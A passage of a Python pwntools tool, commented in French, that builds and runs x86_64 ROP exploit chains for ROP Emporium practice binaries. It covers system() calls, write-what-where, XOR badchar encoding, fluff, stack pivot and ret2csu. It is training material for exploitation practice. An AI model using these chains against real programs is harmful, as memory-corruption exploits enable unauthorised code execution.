  pop_rdi          # gadget pop rdi ; ret
  cmd_addr         # adresse de la commande, placee dans rdi
  system_addr      # system@plt ou system

Important:
  --cmd-addr n'est pas une adresse de code. C'est l'adresse d'une chaine comme
  "/bin/cat flag.txt". On ne saute pas dessus; on la met dans rdi, puis on
  saute vers system().
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    system_parser.add_argument("--pop-rdi", type=parse_int, required=True, help="adresse du gadget pop rdi ; ret; il consomme --cmd-addr et le place dans rdi")
    system_parser.add_argument("--cmd-addr", type=parse_int, required=True, help="adresse memoire de la chaine commande, ex: adresse de '/bin/cat flag.txt'")
    system_parser.add_argument("--system-addr", type=parse_int, required=True, help="adresse de system@plt dans le binaire, ou adresse libc de system si tu fais du ret2libc")
    system_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel place avant pop-rdi pour realigner la stack")
    system_parser.set_defaults(builder=build_system_payload)

    call_parser = subparsers.add_parser(
        "call",
        help="appelle une ou plusieurs fonctions avec des arguments",
        description=(
            "Construit une chaine ROP pour appeler une ou plusieurs fonctions. "
            "Utile pour callme et pour les fonctions qui prennent rdi/rsi/rdx."
        ),
        epilog="""
Exemple callme:
  python3 payload2.py --run --input stdin --target ./callme call \\
    --pop-rdi-rsi-rdx 0x40093c \\
    --arg-rdi 0xdeadbeefdeadbeef \\
    --arg-rsi 0xcafebabecafebabe \\
    --arg-rdx 0xd00df00dd00df00d \\
    --func 0x400720 --func 0x400740 --func 0x4006f0

Exemple avec gadgets separes:
  python3 payload2.py --run --input stdin --target ./bin call \\
    --pop-rdi 0x401123 --arg-rdi 0xdeadbeef \\
    --pop-rsi 0x401125 --arg-rsi 2 \\
    --func 0x401050

Pile generee avec --pop-rdi-rsi-rdx:
  pop_rdi_rsi_rdx
  arg_rdi
  arg_rsi
  arg_rdx
  func_1
  pop_rdi_rsi_rdx
  arg_rdi
  arg_rsi
  arg_rdx
  func_2

Pile generee avec gadgets separes:
  pop_rdi
  arg_rdi
  pop_rsi
  arg_rsi
  pop_rdx
  arg_rdx
  func

Convention Linux x86_64:
  rdi = 1er argument, rsi = 2e, rdx = 3e, rcx = 4e, r8 = 5e, r9 = 6e.
  Les valeurs --arg-* ne sont pas choisies par le script: elles viennent de
  l'enonce, du disassembleur, ou de ce que la fonction attend.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    call_parser.add_argument("--func", dest="funcs", type=parse_int, action="append", required=True, help="adresse de fonction a appeler; repeter --func pour enchainer plusieurs appels")
    call_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack avant les appels")
    call_parser.add_argument("--pop-rdi-rsi-rdx", type=parse_int, help="gadget multi-pop: pop rdi ; pop rsi ; pop rdx ; ret")
    call_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret, utilise si tu fournis --arg-rdi sans multi-pop")
    call_parser.add_argument("--pop-rsi", type=parse_int, help="gadget pop rsi ; ret, utilise si tu fournis --arg-rsi sans multi-pop")
    call_parser.add_argument("--pop-rdx", type=parse_int, help="gadget pop rdx ; ret, utilise si tu fournis --arg-rdx sans multi-pop")
    call_parser.add_argument("--pop-rcx", type=parse_int, help="gadget pop rcx ; ret pour un 4e argument")
    call_parser.add_argument("--pop-r8", type=parse_int, help="gadget pop r8 ; ret pour un 5e argument")
    call_parser.add_argument("--pop-r9", type=parse_int, help="gadget pop r9 ; ret pour un 6e argument")
    call_parser.add_argument("--arg-rdi", type=parse_int, help="valeur du 1er argument, mise dans rdi avant chaque --func")
    call_parser.add_argument("--arg-rsi", type=parse_int, help="valeur du 2e argument, mise dans rsi avant chaque --func")
    call_parser.add_argument("--arg-rdx", type=parse_int, help="valeur du 3e argument, mise dans rdx avant chaque --func")
    call_parser.add_argument("--arg-rcx", type=parse_int, help="valeur du 4e argument, mise dans rcx avant chaque --func")
    call_parser.add_argument("--arg-r8", type=parse_int, help="valeur du 5e argument, mise dans r8 avant chaque --func")
    call_parser.add_argument("--arg-r9", type=parse_int, help="valeur du 6e argument, mise dans r9 avant chaque --func")
    call_parser.set_defaults(builder=build_call_payload)

    write_parser = subparsers.add_parser(
        "write",
        help="ecrit une chaine en memoire avec des gadgets",
        description=(
            "Construit une chaine write-what-where: un gadget pop charge l'adresse et la valeur, "
            "puis un gadget mov ecrit la valeur en memoire. Utile pour write4."
        ),
        epilog="""
Exemple write4:
  python3 payload2.py --run --input stdin --target ./write4 write \\
    --where 0x601028 \\
    --data "flag.txt" --nul-terminate \\
    --pop-write 0x400690 \\
    --write-gadget 0x400628 \\
    --write-order dst-value \\
    --pop-rdi 0x400693 \\
    --call-addr 0x400510

Pile generee par chunk:
  pop_write
  destination/value selon --write-order
  eventuelles valeurs junk de --write-extra-pops
  write_gadget

Choisir --write-order:
  Si ton gadget est:
    pop r14 ; pop r15 ; ret
    mov qword ptr [r14], r15 ; ret
  alors --write-order dst-value.

  Si ton gadget est:
    pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    mov qword ptr [r13], r12 ; ret
  alors --write-order value-dst et --write-extra-pops 2.

Appel final optionnel:
  Avec --pop-rdi et --call-addr, le script ajoute:
    pop_rdi
    call_arg ou where
    call_addr
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    write_parser.add_argument("--where", type=parse_int, required=True, help="adresse writable ou la donnee sera ecrite, ex: .data ou .bss")
    write_parser.add_argument("--data", help="donnees ASCII/UTF-8 a ecrire, ex: flag.txt")
    write_parser.add_argument("--data-hex", help="donnees hex a ecrire, ex: 666c61672e747874 pour flag.txt")
    write_parser.add_argument("--data-file", help="fichier dont le contenu brut doit etre ecrit")
    write_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent, utile pour une string C")
    write_parser.add_argument("--badchars", help="octets interdits a refuser dans la donnee claire, ex: '0x00 0x0a'")
    write_parser.add_argument("--word-size", type=parse_int, default=8, help="nombre d'octets ecrits par write-gadget, souvent 8 en amd64")
    write_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet utilise pour completer le dernier chunk jusqu'a --word-size")
    write_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
    write_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop qui charge les registres utilises par --write-gadget")
    write_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget mov/stos qui ecrit la valeur en memoire")
    write_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des deux premieres valeurs consommees par --pop-write")
    write_parser.add_argument("--write-extra-pops", type=parse_int, default=0, help="nombre de registres supplementaires poppes par --pop-write apres destination/valeur")
    write_parser.add_argument("--write-junk", type=parse_int, default=0x4141414141414141, help="valeur junk utilisee pour remplir les pops supplementaires")
    write_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour preparer l'argument de l'appel final")
    write_parser.add_argument("--call-addr", type=parse_int, help="fonction appelee apres l'ecriture, ex: print_file@plt")
    write_parser.add_argument("--call-arg", type=parse_int, help="argument rdi de l'appel final; defaut: --where")
    write_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel juste avant l'appel final")
    write_parser.set_defaults(builder=build_write_payload)

    badchars_parser = subparsers.add_parser(
        "badchars",
        help="ecrit une chaine encodee puis la decode",
        description=(
            "Encode les donnees avec XOR pour eviter des badchars, ecrit les octets encodes, "
            "puis ajoute des gadgets XOR byte ptr [...] pour les decoder en memoire."
        ),
        epilog="""
Exemple badchars:
  python3 payload2.py --run --input stdin --target ./badchars badchars \\
    --where 0x601038 \\
    --data "flag.txt" --nul-terminate \\
    --badchars "0x78 0x67 0x61 0x2e" \\
    --xor-key 2 \\
    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst --write-extra-pops 2 \\
    --pop-xor 0x4006a0 --xor-gadget 0x400628 --xor-order key-addr \\
    --pop-rdi 0x4006a3 --call-addr 0x400510

Etapes generees:
  1. XOR de chaque octet de --data avec --xor-key.
  2. Ecriture de la donnee encodee avec pop-write/write-gadget.
  3. Pour chaque octet, appel du gadget XOR pour le decoder en memoire.
  4. Optionnellement, pop rdi ; ret puis call-addr.

Ordres:
  --write-order concerne le gadget qui prepare l'ecriture memoire.
  --xor-order concerne le gadget qui prepare la cle XOR et l'adresse a decoder.

Exemple ROP Emporium badchars x64:
  pop-write = pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
  write-gadget = mov qword ptr [r13], r12 ; ret
  donc --write-order value-dst --write-extra-pops 2.

  pop-xor = pop r14 ; pop r15 ; ret
  xor-gadget = xor byte ptr [r15], r14b ; ret
  donc --xor-order key-addr.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    badchars_parser.add_argument("--where", type=parse_int, required=True, help="adresse writable ou ecrire les donnees encodees")
    badchars_parser.add_argument("--data", help="donnees ASCII/UTF-8 a encoder puis ecrire")
    badchars_parser.add_argument("--data-hex", help="donnees hex a encoder puis ecrire")
    badchars_parser.add_argument("--data-file", help="fichier dont le contenu doit etre encode puis ecrit")
    badchars_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent, puis encode aussi cet octet")
    badchars_parser.add_argument("--badchars", required=True, help="octets interdits dans le payload, ex: '0x78 0x67 0x61 0x2e'")
    badchars_parser.add_argument("--xor-key", type=parse_int, required=True, help="cle XOR sur 1 octet; doit produire des octets encodes sans badchars")
    badchars_parser.add_argument("--word-size", type=parse_int, default=8, help="nombre d'octets ecrits par write-gadget, souvent 8 en amd64")
    badchars_parser.add_argument("--pad-byte", type=parse_byte, default=b"\x00", help="octet utilise pour completer le dernier chunk encode")
    badchars_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
    badchars_parser.add_argument("--pop-write", type=parse_int, required=True, help="gadget pop qui charge les registres utilises par --write-gadget")
    badchars_parser.add_argument("--write-gadget", type=parse_int, required=True, help="gadget qui ecrit la valeur encodee en memoire")
    badchars_parser.add_argument("--write-order", choices=("dst-value", "value-dst"), default="dst-value", help="ordre des deux premieres valeurs consommees par --pop-write")
    badchars_parser.add_argument("--write-extra-pops", type=parse_int, default=0, help="nombre de registres supplementaires poppes par --pop-write apres destination/valeur")
    badchars_parser.add_argument("--write-junk", type=parse_int, default=0x4141414141414141, help="valeur junk utilisee pour remplir les pops supplementaires")
    badchars_parser.add_argument("--pop-xor", type=parse_int, required=True, help="gadget pop qui charge la cle XOR et l'adresse de l'octet a decoder")
    badchars_parser.add_argument("--xor-gadget", type=parse_int, required=True, help="gadget qui fait xor byte ptr [addr], key puis ret")
    badchars_parser.add_argument("--xor-order", choices=("key-addr", "addr-key"), default="key-addr", help="ordre des deux valeurs consommees par --pop-xor")
    badchars_parser.add_argument("--pop-rdi", type=parse_int, help="gadget pop rdi ; ret pour preparer l'argument de l'appel final")
    badchars_parser.add_argument("--call-addr", type=parse_int, help="fonction appelee apres decodage, ex: print_file@plt")
    badchars_parser.add_argument("--call-arg", type=parse_int, help="argument rdi de l'appel final; defaut: --where")
    badchars_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel juste avant l'appel final")
    badchars_parser.set_defaults(builder=build_badchars_payload)

    fluff_parser = subparsers.add_parser(
        "fluff",
        help="ecrit une chaine avec bextr/xlatb/stosb puis appelle print_file",
        description=(
            "Construit la chaine du challenge fluff x64: le script cherche chaque octet de la "
            "chaine dans le binaire, regle rbx avec bextr, charge l'octet dans al avec xlatb, "
            "l'ecrit avec stosb, puis appelle print_file(where)."
        ),
        epilog="""
Exemple fluff:
  python3 payload2.py --run --input stdin --target ./fluff fluff \\
    --where 0x601028 \\
    --data "flag.txt" --nul-terminate \\
    --pop-rdi 0x4006a3 \\
    --bextr 0x40062a \\
    --xlat 0x400628 \\
    --stosb 0x400639 \\
    --print-file 0x400510

Pile generee:
  pop_rdi
  where              # rdi pointe vers la zone ou stosb ecrit
  pour chaque octet:
    bextr
    bextr_control
    rcx_calcule
    xlat
    stosb
  pop_rdi
  where
  print_file

Role des gadgets:
  --bextr doit etre le gadget qui finit par mettre une valeur controlee dans rbx.
  --xlat doit pointer vers xlatb ; ret. xlatb fait al = byte ptr [rbx + al].
  --stosb doit pointer vers stosb ; ret. stosb ecrit al a [rdi], puis avance rdi.
  --initial-al est la valeur de al avant le premier xlatb. Dans fluff x64, 0x0b
  marche souvent, mais tu peux la verifier dans pwndbg si besoin.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    fluff_parser.add_argument("--where", type=parse_int, required=True, help="adresse writable ou ecrire la chaine finale")
    fluff_parser.add_argument("--data", help="donnees ASCII/UTF-8 a construire en memoire, ex: flag.txt")
    fluff_parser.add_argument("--data-hex", help="donnees hex a construire en memoire")
    fluff_parser.add_argument("--data-file", help="fichier dont le contenu brut doit etre construit en memoire")
    fluff_parser.add_argument("--nul-terminate", action="store_true", help="ajoute un octet NUL final si absent")
    fluff_parser.add_argument("--pop-rdi", type=parse_int, required=True, help="gadget pop rdi ; ret, utilise pour pointer rdi vers --where puis pour appeler print_file")
    fluff_parser.add_argument("--bextr", type=parse_int, required=True, help="gadget bextr qui permet de controler rbx avant xlatb")
    fluff_parser.add_argument("--xlat", type=parse_int, required=True, help="gadget xlatb ; ret")
    fluff_parser.add_argument("--stosb", type=parse_int, required=True, help="gadget stosb ; ret, ecrit al a [rdi]")
    fluff_parser.add_argument("--print-file", type=parse_int, required=True, help="adresse de print_file@plt ou fonction equivalente a appeler a la fin")
    fluff_parser.add_argument("--initial-al", type=parse_int, default=0x0B, help="valeur de al avant le premier xlatb (defaut: 0x0b pour fluff x64)")
    fluff_parser.add_argument("--bextr-control", type=parse_int, default=0x4000, help="valeur poppee dans le registre de controle bextr (defaut: 0x4000)")
    fluff_parser.add_argument("--bextr-add", type=parse_int, default=0x3EF2, help="constante ajoutee par le gadget bextr a rcx avant bextr (defaut: 0x3ef2)")
    fluff_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel au debut pour aligner la stack")
    fluff_parser.add_argument("--call-ret", type=parse_int, help="gadget ret optionnel juste avant print_file")
    fluff_parser.set_defaults(builder=build_fluff_payload)

    pivot_parser = subparsers.add_parser(
        "pivot",
        help="construit une payload de pivot de stack",
        description="Construit la petite payload qui remplace RSP par une adresse controlee.",
        epilog="""
Exemple pivot classique:
  python3 payload2.py --input stdin --target ./pivot pivot \\
    --pivot-addr 0x7ffff7ffbf10 \\
    --pop-rax 0x4009bb \\
    --xchg-rax-rsp 0x4009bd

Si tu as directement pop rsp ; ret:
  python3 payload2.py --input stdin --target ./pivot pivot \\
    --pivot-addr 0x7ffff7ffbf10 \\
    --pop-rsp 0x400a2d

Payload genere avec pop rax/xchg:
  pop_rax
  pivot_addr
  xchg_rax_rsp

Payload genere avec pop rsp:
  pop_rsp
  pivot_addr

Ce mode ne construit que la petite chaine qui change RSP. La stage2 placee a
--pivot-addr doit etre construite/envoyee separement avec chain, compose, ou
un autre script.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    pivot_parser.add_argument("--pivot-addr", type=parse_int, required=True, help="adresse controlee qui deviendra le nouveau RSP")
    pivot_parser.add_argument("--pop-rsp", type=parse_int, help="gadget pop rsp ; ret si disponible directement")
    pivot_parser.add_argument("--pop-rax", type=parse_int, help="gadget pop rax ; ret utilise avec --xchg-rax-rsp")
    pivot_parser.add_argument("--xchg-rax-rsp", type=parse_int, help="gadget xchg rax, rsp ; ret qui remplace la stack par --pivot-addr")
    pivot_parser.set_defaults(builder=build_pivot_payload)

    ret2csu_parser = subparsers.add_parser(
        "ret2csu",
        help="utilise les gadgets __libc_csu_init",
        description=(
            "Construit la sequence ret2csu classique: gadget pop rbx/rbp/r12/r13/r14/r15, "
            "puis gadget qui fait rdx=r15, rsi=r14, edi=r13d et call [r12+rbx*8]."
        ),
        epilog="""
Schema genere:
  ret optionnel
  csu_pop
  rbx=0
  rbp=1
  r12=call_ptr
  r13=arg_rdi
  r14=arg_rsi
  r15=arg_rdx
  csu_call
  stack_pad
  junk x6
  next_addr optionnel

Details:
  --call-ptr n'est pas forcement l'adresse directe de la fonction. Le gadget
  CSU fait souvent call [r12 + rbx*8], donc --call-ptr doit pointer vers une
  entree GOT ou une case memoire contenant l'adresse de fonction.

  --stack-pad est la valeur consommee par un add rsp, 8 dans le gadget CSU.
  --junk remplit les six pops de nettoyage apres csu_call.

  Attention: beaucoup de gadgets CSU font mov edi, r13d. Dans ce cas, seule la
  partie basse 32 bits de --arg-rdi arrive vraiment dans edi/rdi.

Exemple:
  python3 payload2.py --run --input stdin --target ./ret2csu ret2csu \\
    --csu-pop 0x40089a \\
    --csu-call 0x400880 \\
    --call-ptr 0x600e48 \\
    --arg-rdi 0xdeadbeefdeadbeef \\
    --arg-rsi 0xcafebabecafebabe \\
    --arg-rdx 0xd00df00dd00df00d \\
    --next-addr 0x4007b1
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ret2csu_parser.add_argument("--csu-pop", type=parse_int, required=True, help="gadget pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret")
    ret2csu_parser.add_argument("--csu-call", type=parse_int, required=True, help="gadget CSU qui place rdx/rsi/edi puis fait call [r12+rbx*8]")
    ret2csu_parser.add_argument("--call-ptr", type=parse_int, required=True, help="adresse pointee par r12; doit contenir un pointeur vers la fonction appelee")
    ret2csu_parser.add_argument("--arg-rdi", type=parse_int, required=True, help="valeur chargee via r13/r13d vers rdi/edi")
    ret2csu_parser.add_argument("--arg-rsi", type=parse_int, required=True, help="valeur chargee via r14 vers rsi")
    ret2csu_parser.add_argument("--arg-rdx", type=parse_int, required=True, help="valeur chargee via r15 vers rdx")
    ret2csu_parser.add_argument("--ret", type=parse_int, help="gadget ret optionnel avant la sequence CSU")
    ret2csu_parser.add_argument("--stack-pad", type=parse_int, default=0x4141414141414141, help="valeur consommee par add rsp, 8 dans le gadget CSU")
    ret2csu_parser.add_argument("--junk", type=parse_int, default=0x4242424242424242, help="valeur junk repetee pour les six pops de nettoyage apres csu_call")
    ret2csu_parser.add_argument("--next-addr", type=parse_int, help="adresse executee apres la sequence ret2csu si la fonction appelee retourne")
    ret2csu_parser.set_defaults(builder=build_ret2csu_payload)

    compose_parser = subparsers.add_parser(
        "compose",
        help="assemble des morceaux bruts dans l'ordre exact",
        description="Construit padding + une suite de morceaux. Utile pour les chains tres specifiques comme fluff.",
        epilog="""
Types de morceaux:
  addr:0x401000     packe une adresse en 64 bits little-endian
  u64:0x1234        packe un entier 64 bits
  u32:0x1234        packe un entier 32 bits
  byte:0x41         ajoute un octet
  hex:414243        ajoute des octets depuis hex
  str:ABC           ajoute du texte ASCII/UTF-8
  file:stage2.bin   ajoute le contenu d'un fichier

Exemple:
  python3 payload2.py --offset 40 compose \\
    --part addr:0x400741 \\
    --part addr:0x4007c3 \\
    --part addr:0x601060 \\
    --part addr:0x400560

Payload genere:
  padding
  concat(part_1, part_2, part_3, ...)

compose ne valide pas les gadgets. Il sert quand tu veux controler exactement
chaque octet apres l'offset, ou reproduire a la main une chaine que les modes
specialises ne couvrent pas.
""",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    compose_parser.add_argument("--part", dest="parts", action="append", required=True, help="morceau ajoute tel quel apres le padding; repeter dans l'ordre exact voulu")
    compose_parser.set_defaults(builder=build_compose_payload)

    return parser


def main() -> None:
    parser = build_parser()
    args = parser.parse_args()
    require_pwntools()

    context.update(arch="amd64", os="linux")
    context.log_level = "info"
    context.binary = elf = ELF(args.target)

    if args.checksec:
        log.info("\n%s", elf.checksec())
        if args.mode is None:
            return

    if args.mode is None:
        parser.error("choose a payload mode, or use --checksec alone")

    payload = args.builder(args)
    if args.argv_safe:
        validate_no_nul_for_argv(payload, "final payload")

    write_payload(Path(args.output), payload)

    if not args.no_hexdump:
        print(hexdump(payload))

    if args.run:
        run_payload(args, payload)


if __name__ == "__main__":
    main()

